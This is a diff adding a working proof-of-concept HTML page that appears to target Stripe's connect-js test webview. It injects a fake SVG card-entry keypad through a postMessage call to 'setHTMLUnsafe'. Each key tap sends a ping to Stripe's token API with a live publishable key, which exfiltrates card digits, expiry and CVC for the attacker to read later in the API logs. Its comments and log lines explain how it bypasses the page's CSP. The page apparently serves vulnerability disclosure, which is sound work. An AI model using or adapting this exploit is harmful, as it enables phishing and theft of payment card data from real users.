@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head><title>connect-js.stripe.com HTML Injection + CSP Bypass Exfil PoC</title></head>
+<body>
+<h2>connect-js.stripe.com &mdash; SVG Keypad + Ping Exfil PoC</h2>
+<pre id="log"></pre>
+<button onclick="go()" id="btn">Launch PoC</button>
+<script>
+var log = document.getElementById('log');
+function L(m){ log.textContent += m + '\n'; }
+
+var PK = 'pk_live_51NLbBNCr20g8G3Hgo9u8p4iC1r9NAl7ivBpdAX8j9vALhmH1DYfKq1tbmyvkbGiNjop7YzTZTanSB6ftVS7DoxGA00Z846LP9a';
+var SO = 'https://connect-js.stripe.com';
+var WVURL = SO + '/v1.0/web_test_webview.html#component=account-onboarding&publicKey=' + PK;
+
+function buildCardPageHtml() {
+  var A = String.fromCharCode(38);
+  var P = 'https://api.stripe.com/v1/tokens?key=' + PK
+    + A + 'card[number]=4242424242424242'
+    + A + 'card[exp_month]=12'
+    + A + 'card[exp_year]=2030'
+    + A + 'card[cvc]=000'
+    + A + 'card[name]=';
+
+  var ff = 'Arial,Helvetica,sans-serif';
+
+  // Helper: digit button in SVG
+  function btn(x, y, w, h, label, tag, bg, fg, fs, r) {
+    return '<a href="#" ping="' + P + tag + '">'
+      + '<rect x="' + x + '" y="' + y + '" width="' + w + '" height="' + h + '" rx="' + (r||8) + '" fill="' + (bg||'#fff') + '" stroke="#ddd" stroke-width="1"/>'
+      + '<text x="' + (x + w/2) + '" y="' + (y + h/2 + 1) + '" text-anchor="middle" dominant-baseline="central" font-family="' + ff + '" font-size="' + (fs||18) + '" fill="' + (fg||'#30313d') + '" font-weight="400">' + label + '</text>'
+      + '</a>';
+  }
+
+  var s = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0 0 420 820">'
+
+    // ── Full background ──
+    + '<rect width="420" height="820" fill="#f6f9fc"/>'
+
+    // ── White card ──
+    + '<rect x="30" y="20" width="360" height="780" rx="12" fill="#fff"/>'
+    // Card shadow (subtle)
+    + '<rect x="31" y="21" width="358" height="778" rx="12" fill="none" stroke="#e0e0e0" stroke-width="0.5"/>'
+
+    // ── Stripe logo ──
+    + '<g transform="translate(168,40)">'
+    + '<path fill-rule="evenodd" clip-rule="evenodd" d="M59.64 14.28h-8.06c.19 1.93 1.6 2.55 3.2 2.55 '
+    + '1.64 0 2.96-.37 4.05-.95v3.32a10.6 10.6 0 0 1-4.56 1c-4.01 0-6.83-2.5-6.83-7.14 '
+    + '0-4.36 2.65-7.17 6.25-7.17 3.57 0 5.96 2.81 5.96 7.14 0 .42-.02 1.04-.02 1.25zm-4.14-5.87'
+    + 'c0-.57-.26-2.2-1.82-2.2-1.34 0-1.92 1.27-2.03 2.2h3.85zM40.95 20.2c-1.55 0-2.8-.27-3.79-.73'
+    + 'V3.46l4.14-.88v5.36c.58-.33 1.3-.54 2.18-.54 2.97 0 4.87 2.4 4.86 6.68-.01 4.73-2.93 6.12'
+    + '-5.2 6.12h-2.19zm.37-9.08c-.62 0-1.13.16-1.56.44v5.78c.28.1.74.2 1.24.2 1.31 0 2.38-1.17 '
+    + '2.38-3.42 0-2.04-.84-3-2.06-3zM28.24 6.17c1.39 0 2.45.2 3.5.58v3.6a7 7 0 0 0-3.02-.73'
+    + 'c-1.13 0-1.7.47-1.7 1 0 1.87 5.3 1.4 5.28 5.76 0 3.08-2.34 4.07-5.13 4.07-1.7 0-3-.3'
+    + '-4.1-.8v-3.68c1.14.63 2.58 1.02 3.64 1.02 1.07 0 1.71-.33 1.71-1.03 0-1.87-5.3-1.56'
+    + '-5.28-5.64 0-2.75 1.93-4.14 5.1-4.14zM16.29 3l4.13-.88V5.8h3.12v3.58h-3.12v4.04c0 1.87'
+    + '.75 2.24 1.83 2.24.63 0 1.2-.1 1.7-.3l.32 3.35c-.74.3-1.77.53-3.06.53-3.55 0-4.93-1.88'
+    + '-4.93-5.3V3zM11.79 6.3h3.37v3.43h-3.37v-3.43zm0 5.3h3.37V20h-3.37v-8.4zM6.78 14.84'
+    + 'c0 1.47.98 2.16 2.38 2.16.55 0 1.2-.13 1.65-.3l.24 3.28c-.65.27-1.68.47-2.94.47C4.67'
+    + ' 20.45 2.6 18.55 2.6 15V3.04l4.18-.88v12.68z" fill="#635BFF"/>'
+    + '</g>'
+
+    // ── Title ──
+    + '<text x="210" y="88" text-anchor="middle" font-family="' + ff + '" font-size="17" font-weight="bold" fill="#30313d">Add payment method</text>'
+    + '<text x="210" y="108" text-anchor="middle" font-family="' + ff + '" font-size="13" fill="#6d6e78">Enter your card details below</text>'
+
+    // ── Card visual ──
+    + '<rect x="50" y="125" width="320" height="130" rx="10" fill="#32325d"/>'
+    // Chip
+    + '<rect x="70" y="145" width="32" height="24" rx="4" fill="#e8c547"/>'
+    // Card number
+    + '<text x="70" y="196" font-family="monospace" font-size="15" fill="#fff" opacity="0.7">'
+    + '&#x2022;&#x2022;&#x2022;&#x2022;  &#x2022;&#x2022;&#x2022;&#x2022;  &#x2022;&#x2022;&#x2022;&#x2022;  </text>'
+    + '<text x="294" y="196" font-family="monospace" font-size="15" fill="#a0b4ff">_ _ _ _</text>'
+    // Labels
+    + '<text x="70" y="230" font-family="' + ff + '" font-size="8" fill="#fff" opacity="0.5" letter-spacing="1">VALID THRU</text>'
+    + '<text x="70" y="242" font-family="' + ff + '" font-size="11" fill="#fff" opacity="0.7">MM / YY</text>'
+    + '<text x="310" y="230" font-family="' + ff + '" font-size="8" fill="#fff" opacity="0.5" letter-spacing="1">CVC</text>'
+    + '<text x="310" y="242" font-family="' + ff + '" font-size="11" fill="#fff" opacity="0.7">_ _ _</text>'
+
+    // ── Card Number label ──
+    // Lock icon
+    + '<path d="M58 278v-3a4 4 0 018 0v3" fill="none" stroke="#6d6e78" stroke-width="1.5"/>'
+    + '<rect x="55" y="278" width="14" height="10" rx="2" fill="none" stroke="#6d6e78" stroke-width="1.5"/>'
+    + '<text x="75" y="287" font-family="' + ff + '" font-size="11" font-weight="bold" fill="#6d6e78" letter-spacing="0.8">CARD NUMBER</text>';
+
+  // ── Number pad 3x4 ──
+  var kw = 96, kh = 50, gap = 6;
+  var kx0 = 58; // start x
+  var ky0 = 298; // start y
+
+  var digits = [
+    ['1','KEY_1'], ['2','KEY_2'], ['3','KEY_3'],
+    ['4','KEY_4'], ['5','KEY_5'], ['6','KEY_6'],
+    ['7','KEY_7'], ['8','KEY_8'], ['9','KEY_9']
+  ];
+
+  for (var i = 0; i < digits.length; i++) {
+    var col = i % 3;
+    var row = Math.floor(i / 3);
+    var bx = kx0 + col * (kw + gap);
+    var by = ky0 + row * (kh + gap);
+    s += btn(bx, by, kw, kh, digits[i][0], digits[i][1]);
+  }
+
+  // Row 4: CLEAR, 0, NEXT
+  var r4y = ky0 + 3 * (kh + gap);
+  s += btn(kx0, r4y, kw, kh, 'CLEAR', 'KEY_CLR', '#f0f0f0', '#6d6e78', 12);
+  s += btn(kx0 + kw + gap, r4y, kw, kh, '0', 'KEY_0');
+  s += '<a href="#" ping="' + P + 'KEY_OK">'
+    + '<rect x="' + (kx0 + 2*(kw+gap)) + '" y="' + r4y + '" width="' + kw + '" height="' + kh + '" rx="8" fill="#635BFF" stroke="#635BFF" stroke-width="1"/>'
+    + '<text x="' + (kx0 + 2*(kw+gap) + kw/2) + '" y="' + (r4y + kh/2 + 1) + '" text-anchor="middle" dominant-baseline="central" font-family="' + ff + '" font-size="12" fill="#fff" font-weight="bold">NEXT &#x2192;</text>'
+    + '</a>';
+
+  // ── Expiry label ──
+  var ey = r4y + kh + 24;
+  s += '<text x="58" y="' + ey + '" font-family="' + ff + '" font-size="11" font-weight="bold" fill="#6d6e78" letter-spacing="0.8">EXPIRY MONTH</text>';
+
+  // Month buttons (6x2)
+  var my0 = ey + 10;
+  var mw = 46, mh = 34, mg = 4;
+  var months = ['01','02','03','04','05','06','07','08','09','10','11','12'];
+  for (var m = 0; m < 12; m++) {
+    var mc = m % 6;
+    var mr = Math.floor(m / 6);
+    var mx = 58 + mc * (mw + mg);
+    var my = my0 + mr * (mh + mg);
+    s += btn(mx, my, mw, mh, months[m], 'EXP_' + months[m], '#fff', '#30313d', 12, 6);
+  }
+
+  // ── Year label ──
+  var yy0 = my0 + 2 * (mh + mg) + 16;
+  s += '<text x="58" y="' + yy0 + '" font-family="' + ff + '" font-size="11" font-weight="bold" fill="#6d6e78" letter-spacing="0.8">EXPIRY YEAR</text>';
+
+  // Year buttons
+  var yby = yy0 + 10;
+  var yw = 46;
+  var years = ['25','26','27','28','29','30'];
+  for (var y = 0; y < 6; y++) {
+    s += btn(58 + y * (yw + mg), yby, yw, mh, years[y], 'YR_' + years[y], '#fff', '#30313d', 12, 6);
+  }
+
+  // ── CVC label ──
+  var cy0 = yby + mh + 20;
+  s += '<path d="M58 ' + (cy0 - 8) + 'v-3a4 4 0 018 0v3" fill="none" stroke="#6d6e78" stroke-width="1.5"/>'
+    + '<rect x="55" y="' + (cy0 - 8) + '" width="14" height="10" rx="2" fill="none" stroke="#6d6e78" stroke-width="1.5"/>'
+    + '<text x="75" y="' + cy0 + '" font-family="' + ff + '" font-size="11" font-weight="bold" fill="#6d6e78" letter-spacing="0.8">SECURITY CODE</text>';
+
+  // CVC digit buttons
+  var cby = cy0 + 10;
+  var cw = 28, ch = 34;
+  for (var c = 0; c <= 9; c++) {
+    s += btn(58 + c * (cw + mg), cby, cw, ch, c, 'CVC_' + c, '#fff', '#30313d', 12, 6);
+  }
+
+  // ── Confirm button ──
+  var sby = cby + ch + 20;
+  s += '<a href="#" ping="' + P + 'SUBMIT">'
+    + '<rect x="50" y="' + sby + '" width="320" height="48" rx="8" fill="#635BFF"/>'
+    + '<text x="210" y="' + (sby + 25) + '" text-anchor="middle" font-family="' + ff + '" font-size="15" fill="#fff" font-weight="bold">Confirm payment method</text>'
+    + '</a>';
+
+  // ── Footer ──
+  var fy = sby + 64;
+  s += '<text x="210" y="' + fy + '" text-anchor="middle" font-family="' + ff + '" font-size="11" fill="#a3acb9">&#x1F512; Secured by Stripe</text>';
+
+  s += '</svg>';
+
+  return s;
+}
+
+function go(){
+  document.getElementById('btn').disabled = true;
+  L('[*] Step 1: Opening connect-js.stripe.com webview...');
+
+  var w = window.open(WVURL, 'stripe_webview', 'width=440,height=840');
+  L('[*] URL bar shows connect-js.stripe.com');
+
+  setTimeout(function(){
+    L('[+] Step 2: Sending init messages...');
+    w.postMessage({type:'connect-test-sdk-message',requestType:'fetchInitParams',values:{publishableKey:PK,locale:'en'}}, SO);
+    w.postMessage({type:'connect-test-sdk-message',requestType:'fetchInitComponentProps',values:{}}, SO);
+    w.postMessage({type:'connect-test-sdk-message',requestType:'fetchAppInfo',values:{}}, SO);
+    w.postMessage({type:'connect-test-sdk-message',requestType:'fetchClientSecret',values:'acs_test_fake'}, SO);
+  }, 1500);
+
+  setTimeout(function(){
+    L('[+] Step 3: Injecting SVG card keypad...');
+    w.postMessage({type:'connect-test-sdk-message',requestType:'callSetterWithSerializableValue',values:{setter:'setHTMLUnsafe',value:buildCardPageHtml()}}, SO);
+    L('[+] Injected! All styling via SVG presentation attributes (bypasses style-src CSP)');
+    L('[+] Each key tap fires <a ping> to api.stripe.com (bypasses connect-src CSP)');
+    L('');
+    L('Exfil markers in card[name]:');
+    L('  KEY_0-9 = card digits | EXP_01-12 = month');
+    L('  YR_25-30 = year | CVC_0-9 = cvc digits');
+    L('  SUBMIT = confirm tap');
+    L('');
+    L('Read sequence: Dashboard -> Developers -> Logs');
+  }, 3000);
+}
+</script>
+</body>
+</html>
